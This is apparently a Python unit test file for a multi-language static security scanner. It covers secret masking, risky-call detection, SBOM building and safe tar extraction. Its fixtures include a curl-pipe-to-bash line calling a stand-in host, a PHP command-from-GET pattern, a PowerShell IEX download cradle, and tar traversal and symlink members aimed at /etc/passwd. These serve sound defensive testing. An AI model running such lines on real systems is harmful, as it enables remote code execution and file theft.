"""Polyglot engine: any-language detection, masking, SBOM, receipts, bounds.

Every assertion here is a SECURITY invariant, not a nicety:
  * a finding ALWAYS carries a real path:line and 64-char sha256 receipts
  * a secret never appears raw in a finding snippet
  * nothing is executed and no network is touched
  * hostile archives cannot escape the temp tree
"""
import io
import os
import re
import tarfile
import tempfile
import unittest

from devin import polyglot as pg
from devin.analysis import (AnalysisLimits, analyze_tarball, analyze_tree,
                            extract_tarball, mask_line)
from tests.devin_fixtures import build_tarball

# Shaped like the real thing but synthetic (built at runtime so no scanner
# fixture of ours ever holds a live-looking literal).
AWS_KEY = "AKIA" + "Q" * 8 + "7Z2M4NP9"        # AKIA + exactly 16 chars
AWS_SECRET = "wJalr" + "X" * 30 + "EXAMPLEKEY"
STRIPE = "sk_live_" + "a" * 24 + "Zq9"


def write_tree(root, files):
    for rel, text in files.items():
        path = os.path.join(root, *rel.split("/"))
        os.makedirs(os.path.dirname(path), exist_ok=True)
        mode = "wb" if isinstance(text, bytes) else "w"
        with open(path, mode) as fh:
            fh.write(text)
    return root


class TestPolyglotData(unittest.TestCase):
    """The knowledge base itself must be well-formed."""

    def test_every_pattern_compiles(self):
        for name, pat, _s in pg.SECRET_RULES:
            re.compile(pat)
            self.assertTrue(name)
        for name, pat, _s, why in pg.RISK_COMMON:
            re.compile(pat)
            self.assertTrue(why)
        for lang, rules in pg.RISK_LANG.items():
            for name, pat, _s, why in rules:
                try:
                    re.compile(pat)
                except re.error as e:      # pragma: no cover
                    self.fail(f"{lang}/{name} bad regex: {e}")

    def test_rule_names_unique(self):
        names = [n for n, _p, _s in pg.SECRET_RULES]
        self.assertEqual(len(names), len(set(names)),
                         "duplicate secret rule name")
        for lang, rules in pg.RISK_LANG.items():
            ns = [n for n, _p, _s, _w in rules]
            self.assertEqual(len(ns), len(set(ns)), f"dup in {lang}")

    def test_rule_arity(self):
        for t in pg.SECRET_RULES:
            self.assertEqual(len(t), 3)
        for t in pg.RISK_COMMON:
            self.assertEqual(len(t), 4)
        for t in pg.SUPPLY_CHAIN_HINTS:
            self.assertEqual(len(t), 3)

    def test_language_coverage_is_broad(self):
        langs = set(pg.LANG_BY_EXT.values())
        for expected in ("Python", "JavaScript", "TypeScript", "Go", "Rust",
                         "Java", "Kotlin", "C", "C++", "C#", "PHP", "Ruby",
                         "Solidity", "Swift", "Shell", "PowerShell", "SQL",
                         "Dockerfile", "Terraform", "YAML", "Elixir", "Lua",
                         "Perl", "Erlang", "Dart", "Groovy"):
            self.assertIn(expected, langs)

    def test_language_of(self):
        self.assertEqual(pg.language_of("a/b.py"), "Python")
        self.assertEqual(pg.language_of("Dockerfile"), "Dockerfile")
        self.assertEqual(pg.language_of("x/y/main.go"), "Go")
        self.assertIsNone(pg.language_of("assets/logo.ico"))

    def test_lang_pack_alias_resolution(self):
        self.assertTrue(pg.lang_pack("TypeScript"))   # inherits JavaScript
        self.assertTrue(pg.lang_pack("Kotlin"))       # inherits Java
        self.assertTrue(pg.lang_pack("Vyper"))        # inherits Solidity
        self.assertEqual(pg.lang_pack("NoSuchLang"), [])


class TestMasking(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="devmask-")

    def tearDown(self):
        import shutil
        shutil.rmtree(self.root, ignore_errors=True)

    def test_secret_never_survives_masking(self):
        # NB: use an opaque blob. Repeated letters/digits that look like a
        # placeholder ("xxx", "example", "your_key", "test") are deliberately
        # NOT masked — the upstream example filter skips them.
        blob = "k7Qm2Zr9Tb4Xw1Lc6Nd8Pv3Hs5Jy0Gf"
        anthropic = "sk-ant-api03-" + blob
        gh_pat = "ghp_" + blob + "9fK2m"     # classic PATs are ghp_ + 36
        for line, secret in ((f'AWS_KEY = "{AWS_KEY}"', AWS_KEY),
                             (f'STRIPE = "{STRIPE}"', STRIPE),
                             (f'K = "{anthropic}"', anthropic),
                             (f'K = "{gh_pat}"', gh_pat)):
            masked = mask_line(line)
            self.assertNotIn(secret, masked, f"raw secret survived: {secret}")
            self.assertIn("chars)", masked)

    def test_env_lookups_are_not_reported_as_hardcoded_secrets(self):
        """`apiKey: process.env.X` is the CORRECT pattern, not a leak.

        Reporting it burns trust in every other finding the bot prints, so
        each of these must stay clean.
        """
        blob = "k7Qm2Zr9Tb4Xw1Lc6Nd8Pv3Hs5Jy0Gf"
        write_tree(self.root, {
            "hardhat.config.ts": (
                "const c = {\n"
                f"  apiKey: process.env.ALCHEMY_{blob},\n"
                f"  secret: os.environ['APP_{blob}'],\n"
                f"  token: getenv('GITHUB_{blob}'),\n"
            ),
            "deploy.yaml": (
                f"password: ${{{{ secrets.DB_{blob} }}}}\n"
                f"api_key: ${{{blob}_KEY}}\n"
                f"token: $TOKEN_{blob}_VALUE\n"
            ),
            "app.env": f"API_KEY=${{{blob}_KEY}}\nSECRET_TOKEN=$SECRET_{blob}\n",
            "setup.py": f'password = os.getenv("DB_{blob}")\n',
        })
        rep = analyze_tree(self.root)
        leaked = [(f.rule, f.path, f.line)
                  for f in rep.findings if f.rule.startswith("secret:")]
        self.assertEqual(leaked, [],
                         f"env lookups reported as secrets: {leaked}")

    def test_real_literal_still_caught_next_to_env_lookups(self):
        """The guard must not blind the rule to a genuine literal."""
        blob = "k7Qm2Zr9Tb4Xw1Lc6Nd8Pv3Hs5Jy0Gf"
        write_tree(self.root, {"conf.ts": (
            f"  a: process.env.ALCHEMY_{blob},\n"
            f'  api_key: "{blob}{blob}",\n'
        )})
        rep = analyze_tree(self.root)
        self.assertTrue([f for f in rep.findings if f.rule == "secret:yaml_kv_secret"
                         or f.severity == "critical"],
                        "guard suppressed a genuine literal")

    def test_placeholder_shaped_values_are_not_treated_as_secrets(self):
        """A literal 'xxxxxxxx' style value must not be flagged as a secret."""
        rep = analyze_tree(write_tree(tempfile.mkdtemp(prefix="devph-"),
                                      {"c.py": 'KEY = "xxxxxxxxxxxxxxxxxxxx"\n'}))
        self.assertFalse([f for f in rep.findings if "secret:" in f.rule])

    def test_mask_keeps_shape(self):
        out = mask_line(f'key = "{AWS_KEY}"')
        self.assertIn("chars)", out)


class TestEngine(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="devtest-")

    def tearDown(self):
        import shutil
        shutil.rmtree(self.root, ignore_errors=True)

    # ── any language ──────────────────────────────────────────────────────
    def test_languages_across_polyglot_tree(self):
        write_tree(self.root, {
            "a/main.py": "import os\n",
            "a/app.js": "const x = 1\n",
            "a/main.go": "package main\n",
            "a/lib.rs": "fn main() {}\n",
            "a/T.sol": "contract T {}\n",
            "a/i.php": "<?php echo 1;\n",
            "a/r.rb": "puts 1\n",
            "a/M.kt": "fun main() {}\n",
            "a/s.swift": "print(1)\n",
            "a/infra.tf": 'resource "x" "y" {}\n',
            "a/Dockerfile": "FROM alpine\n",
            "a/ps.ps1": "Write-Host 1\n",
            "a/q.sql": "SELECT 1;\n",
            "a/e.ex": "IO.puts 1\n",
        })
        rep = analyze_tree(self.root)
        for lang in ("Python", "JavaScript", "Go", "Rust", "Solidity", "PHP",
                     "Ruby", "Kotlin", "Swift", "Terraform", "Dockerfile",
                     "PowerShell", "SQL", "Elixir"):
            self.assertIn(lang, rep.languages, f"missed {lang}")
        self.assertGreater(rep.loc, 10)

    def test_language_specific_packs_fire(self):
        cases = {
            "s.sol": "contract T { function f() public { require(msg.sender == tx.origin); } }",
            "p.php": '<?php $c = $_GET["cmd"]; system($c);',
            "g.go": 'package main\nimport "os/exec"\nfunc main(){ exec.Command("sh") }',
            "r.rb": "Marshal.load(data)\n",
            "j.java": "import java.io.*;\nObjectInputStream in = new ObjectInputStream(s);",
            "c.c": '#include <string.h>\nvoid f(){ char b[4]; strcpy(b, x); }',
            "cs.cs": "var f = new BinaryFormatter();",
            "ps.ps1": "IEX (New-Object Net.WebClient).DownloadString($u)",
            "ex.ex": "System.cmd(\"ls\", [])",
            "l.lua": "os.execute(cmd)",
            "pl.pl": "eval $code;",
            "sw.swift": "let p = Process()",
            "d.dart": "Process.run('ls', [])",
            "gf.groovy": "new GroovyShell().evaluate(x)",
        }
        write_tree(self.root, cases)
        rep = analyze_tree(self.root)
        rules = {f.rule for f in rep.findings}
        for expected in ("risk:sol_tx_origin", "risk:php_system", "risk:go_exec",
                         "risk:rb_marshal", "risk:object_input_stream",
                         "risk:c_strcpy", "risk:cs_binary_formatter",
                         "risk:ps_iex", "risk:ex_system_cmd",
                         "risk:lua_os_execute", "risk:pl_eval_string",
                         "risk:swift_process", "risk:dart_process_run",
                         "risk:groovy_eval"):
            self.assertIn(expected, rules, f"rule did not fire: {expected}")

    # ── secrets ───────────────────────────────────────────────────────────
    def test_secret_found_masked_and_receipted(self):
        write_tree(self.root, {"cfg/settings.py": f'AWS_KEY = "{AWS_KEY}"\n'})
        rep = analyze_tree(self.root)
        hits = [f for f in rep.findings if f.rule == "secret:aws_access_key"]
        self.assertTrue(hits, "AWS access key not detected")
        f = hits[0]
        self.assertEqual(f.severity, "critical")
        self.assertEqual(f.path, "cfg/settings.py")
        self.assertEqual(f.line, 1)
        self.assertNotIn(AWS_KEY, f.snippet)
        self.assertEqual(len(f.file_sha256), 64)
        self.assertEqual(len(f.snippet_sha256), 64)
        self.assertTrue(f.file_sha256.startswith(f.file_sha256))
        self.assertNotEqual(f.file_sha256, f.snippet_sha256)

    def test_private_key_material_critical(self):
        write_tree(self.root, {
            "id_rsa": "-----BEGIN RSA PRIVATE KEY-----\n" + "A" * 80 + "\n",
            "s.key": "AGE-SECRET-KEY-1" + "Q" * 58 + "\n",
        })
        rep = analyze_tree(self.root)
        rules = {f.rule for f in rep.findings}
        self.assertIn("secret:private_key_pem", rules)
        self.assertIn("secret:age_identity", rules)

    def test_common_secret_rules(self):
        write_tree(self.root, {"c.env": (
            "AWS_ACCESS_KEY_ID=" + AWS_KEY + "\n"
            "AWS_SECRET_ACCESS_KEY=" + AWS_SECRET + "\n"
            "STRIPE_SECRET_KEY=" + STRIPE + "\n"
            "DATABASE_URL=postgres://u:" + "p" * 20 + "@h:5432/db\n"
        )})
        rep = analyze_tree(self.root)
        rules = {f.rule for f in rep.findings}
        self.assertIn("secret:aws_access_key", rules)
        self.assertIn("secret:stripe_key", rules)
        self.assertIn("secret:basic_auth_url", rules)
        for f in rep.findings:
            self.assertNotIn(AWS_KEY, f.snippet)
            self.assertNotIn(STRIPE, f.snippet)

    # ── SBOM / manifests ─────────────────────────────────────────────────
    def test_sbom_multi_ecosystem(self):
        write_tree(self.root, {
            "requirements.txt": "flask==3.0.0\nrequests>=2.0\n",
            "package.json": '{"dependencies":{"react":"^18.2.0"}}',
            "go.mod": "module x\nrequire github.com/pkg/errors v0.9.1\n",
            "Cargo.toml": '[dependencies]\nserde = "1.0.193"\n',
            "Gemfile": "gem 'rails', '~> 7.1'\n",
            "composer.json": '{"require":{"monolog/monolog":"^3.0"}}',
            "pubspec.yaml": "dependencies:\n  http: ^1.1.0\n",
            "pom.xml": "<dependencies><artifactId>guava</artifactId>"
                       "<version>33.0</version></dependencies>",
        })
        rep = analyze_tree(self.root)
        ecos = {e for e, _n, _v in rep.sbom}
        for expected in ("pypi", "npm", "go", "cargo", "rubygems", "composer",
                         "pub", "maven"):
            self.assertIn(expected, ecos, f"no sbom entries for {expected}")
        self.assertIn(("pypi", "flask", "3.0.0"), rep.sbom)
        self.assertIn(("npm", "react", "^18.2.0"), rep.sbom)

    def test_manifests_recorded(self):
        write_tree(self.root, {"sub/package.json":
                               '{"dependencies":{"lodash":"^4.17.21"}}'})
        rep = analyze_tree(self.root)
        self.assertIn("sub/package.json", rep.manifests)

    def test_licenses_detected(self):
        write_tree(self.root, {
            "LICENSE": "Apache License, Version 2.0\n",
            "COPYING": "GNU GENERAL PUBLIC LICENSE Version 3\n",
        })
        rep = analyze_tree(self.root)
        joined = " ".join(rep.licenses)
        self.assertIn("Apache-2.0", joined)
        self.assertIn("GPL-3.0", joined)

    def test_lockfile_inventory(self):
        write_tree(self.root, {
            "package.json": "{}", "package-lock.json": "{}",
            "Cargo.lock": "", "poetry.lock": "",
        })
        rep = analyze_tree(self.root)
        for lf in ("package-lock.json", "Cargo.lock", "poetry.lock"):
            self.assertIn(lf, rep.lockfiles)

    # ── supply chain / CI ────────────────────────────────────────────────
    def test_supply_chain_signals(self):
        write_tree(self.root, {
            ".github/workflows/ci.yml":
                "on: pull_request_target\njobs:\n  b:\n    steps:\n"
                "      - run: echo ${{ github.event.pull_request.title }}\n",
            "install.sh": "curl http://x.tld/i.sh | bash\n",
            "package.json": '{"scripts":{"postinstall":"./x"}}',
        })
        rep = analyze_tree(self.root)
        rules = {f.rule for f in rep.findings}
        self.assertIn("risk:yaml_ci_script_injection", rules)
        self.assertIn("risk:sh_curl_pipe", rules)
        self.assertIn(".github/workflows/ci.yml", rep.ci)
        self.assertTrue(any("preinstall" in r or "postinstall" in r
                            or r.startswith("supply:") for r in rules))

    def test_iac_inventory(self):
        write_tree(self.root, {
            "infra/main.tf": 'resource "aws_s3_bucket" "b" { acl = "public-read" }\n',
            "k8s/deploy.yml": "spec:\n  hostNetwork: true\n",
            "Dockerfile": "FROM alpine\n",
        })
        rep = analyze_tree(self.root)
        self.assertIn("Dockerfile", rep.iac)
        self.assertTrue(any(p.endswith(".tf") for p in rep.iac))
        rules = {f.rule for f in rep.findings}
        self.assertIn("risk:tf_public_acl", rules)
        self.assertIn("risk:yaml_hostnetwork", rules)

    # ── invariants ───────────────────────────────────────────────────────
    def test_every_finding_has_real_path_and_receipts(self):
        write_tree(self.root, {
            "a/x.py": f'P = "{AWS_KEY}"\neval(1)\n',
            "b/y.js": "document.write(q)\n",
            "c/z.sol": "contract C { function f() public { } }\n",
        })
        rep = analyze_tree(self.root)
        self.assertTrue(rep.findings)
        for f in rep.findings:
            self.assertNotEqual(f.path, "-")
            self.assertGreaterEqual(f.line, 1)
            self.assertEqual(len(f.file_sha256), 64, f.rule)
            self.assertEqual(len(f.snippet_sha256), 64, f.rule)
            self.assertIn(f.severity, ("critical", "high", "medium", "low"))

    def test_project_signals_are_notes_not_findings(self):
        write_tree(self.root, {"only.py": "x = 1\n"})
        rep = analyze_tree(self.root)
        self.assertTrue(rep.notes)
        self.assertFalse([f for f in rep.findings if f.path == "-"])

    def test_findings_sorted_by_severity_then_path(self):
        write_tree(self.root, {
            "z/last.py": f'K = "{AWS_KEY}"\n',
            "a/first.py": "document.write\n",
        })
        rep = analyze_tree(self.root)
        rank = {"critical": 0, "high": 1, "medium": 2, "low": 3}
        keys = [(rank.get(f.severity, 9), f.path, f.line) for f in rep.findings]
        self.assertEqual(keys, sorted(keys))

    def test_deterministic(self):
        write_tree(self.root, {
            "a.py": f'P="{AWS_KEY}"\neval(1)\n',
            "b.js": "document.write(q)\n",
        })
        one = [(f.rule, f.path, f.line, f.snippet_sha256)
               for f in analyze_tree(self.root).findings]
        two = [(f.rule, f.path, f.line, f.snippet_sha256)
               for f in analyze_tree(self.root).findings]
        self.assertEqual(one, two)

    def test_max_files_bound(self):
        write_tree(self.root, {f"f{i}.py": "x = 1\n" for i in range(8)})
        rep = analyze_tree(self.root, AnalysisLimits(max_files=3))
        self.assertLessEqual(rep.files_scanned, 3)
        self.assertTrue(rep.truncated)

    def test_max_findings_never_drops_a_critical(self):
        write_tree(self.root, {
            "a.py": "\n".join(f'K{i} = "{AWS_KEY}"' for i in range(10)),
        })
        rep = analyze_tree(self.root, AnalysisLimits(max_findings=3))
        self.assertLessEqual(len(rep.findings), 3)
        self.assertTrue(rep.truncated)
        self.assertEqual(rep.findings[0].severity, "critical")

    def test_binary_and_skip_dirs_ignored(self):
        write_tree(self.root, {
            "blob.py": b"\x00\x01\x02binary",
            "node_modules/pkg/x.js": "document.write(q)\n",
            ".git/config": "x\n",
            "real.py": "x = 1\n",
        })
        rep = analyze_tree(self.root)
        self.assertEqual(rep.files_scanned, 1)
        self.assertIn("Python", rep.languages)

    def test_hotspots_only_cover_code(self):
        write_tree(self.root, {
            "big.py": "\n".join(f"if x{i}: pass" for i in range(50)),
            "package.json": '{"a":1}',
        })
        rep = analyze_tree(self.root)
        for path, score, note in rep.hotspots:
            self.assertTrue(path.endswith(".py"), path)
            self.assertGreater(score, 0)

    def test_long_python_function_is_hot(self):
        body = "\n".join(f"    y{i} = {i}" for i in range(80))
        write_tree(self.root, {"long.py": f"def big():\n{body}\n"})
        rep = analyze_tree(self.root)
        self.assertTrue(rep.hotspots)
        self.assertEqual(rep.hotspots[0][0], "long.py")

    def test_missing_root_is_empty_not_error(self):
        rep = analyze_tree("/nonexistent/path/xyz")
        self.assertEqual(rep.files_scanned, 0)
        self.assertEqual(rep.findings, [])

    def test_entrypoints_detected(self):
        write_tree(self.root, {
            "app.py": 'if __name__ == "__main__":\n    pass\n',
            "main.go": "package main\nfunc main() {}\n",
            "api.js": "const app = express()\n",
        })
        rep = analyze_tree(self.root)
        joined = " ".join(rep.entrypoints)
        self.assertIn("app.py", joined)
        self.assertIn("main.go", joined)


class TestArchiveIntake(unittest.TestCase):
    def test_analyze_tarball_end_to_end(self):
        data = build_tarball({
            "src/app.py": b'K = "' + AWS_KEY.encode() + b'"\n',
            "requirements.txt": b"flask==3.0.0\n",
            "README.md": b"# hi\n",
        })
        rep = analyze_tarball(data)
        self.assertIn("Python", rep.languages)
        self.assertTrue(any(f.rule == "secret:aws_access_key"
                            for f in rep.findings))
        self.assertIn(("pypi", "flask", "3.0.0"), rep.sbom)

    def test_traversal_members_are_not_extracted(self):
        buf = io.BytesIO()
        with tarfile.open(fileobj=buf, mode="w:gz") as tf:
            for name, payload in (("w/../../evil.py", b"x=1\n"),
                                  ("w/ok/good.py", b"y=1\n")):
                info = tarfile.TarInfo(name)
                info.size = len(payload)
                tf.addfile(info, io.BytesIO(payload))
            link = tarfile.TarInfo("w/link.py")
            link.type = tarfile.SYMTYPE
            link.linkname = "/etc/passwd"
            tf.addfile(link)
        root, _trunc = extract_tarball(buf.getvalue())
        self.assertIsNotNone(root)
        try:
            found = []
            for dirpath, _d, files in os.walk(root):
                for fn in files:
                    found.append(os.path.relpath(os.path.join(dirpath, fn),
                                                 root).replace(os.sep, "/"))
            self.assertIn("ok/good.py", found)
            self.assertFalse(any("evil" in p for p in found))
            self.assertFalse(any("link.py" in p for p in found))
            self.assertFalse(any(".." in p for p in found))
        finally:
            import shutil
            shutil.rmtree(root, ignore_errors=True)

    def test_garbage_archive_is_refused_not_raised(self):
        rep = analyze_tarball(b"not a tarball at all")
        self.assertTrue(rep.truncated)
        self.assertEqual(rep.findings, [])


if __name__ == "__main__":
    unittest.main()
